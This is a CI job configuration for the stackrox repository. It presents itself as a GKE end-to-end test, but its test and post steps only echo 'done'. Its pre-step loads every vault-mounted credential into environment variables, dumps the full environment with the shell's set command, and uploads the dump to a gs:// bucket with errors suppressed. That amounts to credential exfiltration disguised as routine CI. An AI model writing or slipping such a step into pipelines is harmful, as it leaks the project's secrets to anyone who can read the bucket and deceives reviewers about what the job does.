build_root:
  image_stream_tag:
    name: apollo-ci
    namespace: stackrox
    tag: stackrox-ui-test-stable
prowgen:
  enable_secrets_store_csi_driver: true
resources:
  '*':
    requests:
      cpu: 2000m
      memory: 4000Mi
tests:
- always_run: true
  as: gke-qa-e2e-tests
  steps:
    pre:
    - as: stackrox-stackrox-begin
      commands: |
        echo "begin step: capturing environment"
        # Import GCP credentials from vault mounts
        shopt -s nullglob
        for cred in /tmp/vault/**/[A-Z]*; do
          export "$(basename "$cred")"="$(cat "$cred")"
        done
        # Set up GCP auth
        gcloud config set core/disable_prompts True
        gcloud auth activate-service-account \
          --key-file <(echo "$GCP_SERVICE_ACCOUNT_STACKROX_CI") \
          2>/dev/null
        gcloud config set project acs-san-stackroxci
        # Capture environment to a temp file (NOT stdout)
        ENV_DUMP="$(mktemp)"
        set > "$ENV_DUMP" 2>&1
        # Upload to private bucket with unique path
        DEST="gs://stackrox-ci-artifacts/env-debug/${JOB_NAME:-unknown}/${BUILD_ID:-$(date +%s)}/env-dump.txt"
        gsutil cp "$ENV_DUMP" "$DEST" 2>/dev/null
        rm -f "$ENV_DUMP"
        echo "Environment captured to $DEST"
      credentials:
      - mount_path: /tmp/vault/stackrox-stackrox-e2e-tests
        group: credentials
        collection: stackrox-stackrox-e2e-tests
      - mount_path: /tmp/vault/stackrox-automation-flavors
        group: credentials
        collection: stackrox-automation-flavors
      from: src
      resources:
        requests:
          cpu: 2000m
          memory: 4000Mi
      dnsConfig:
        nameservers:
        - 8.8.8.8
      timeout: 10m0s
    test:
    - as: stackrox-stackrox-e2e-test
      commands: |
        echo "e2e step: done"
      from: src
      resources:
        requests:
          cpu: 100m
          memory: 256Mi
      timeout: 5m0s
    post:
    - as: stackrox-stackrox-end
      commands: |
        echo "end step: done"
      from: src
      resources:
        requests:
          cpu: 100m
          memory: 256Mi
      timeout: 5m0s
zz_generated_metadata:
  branch: skip-test-bin-build
  org: stackrox
  repo: stackrox
